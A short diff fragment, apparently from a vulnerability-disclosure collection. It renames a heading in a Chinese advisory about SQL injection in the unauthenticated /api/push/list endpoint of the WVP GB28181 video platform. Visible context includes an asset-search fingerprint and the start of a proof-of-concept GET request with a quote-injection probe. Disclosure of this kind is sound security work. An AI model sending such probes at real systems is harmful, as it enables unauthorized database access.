@@ -8,7 +8,7 @@ WVP视频平台(国标28181)未授权接口/api/push/list存在SQL注入漏洞
 body="国标28181"
 ```
 
-## poc
+## POC
 
 ```
 GET /api/push/list?page=1&count=15&query=1'&pushing=&mediaServerId= HTTP/1.1
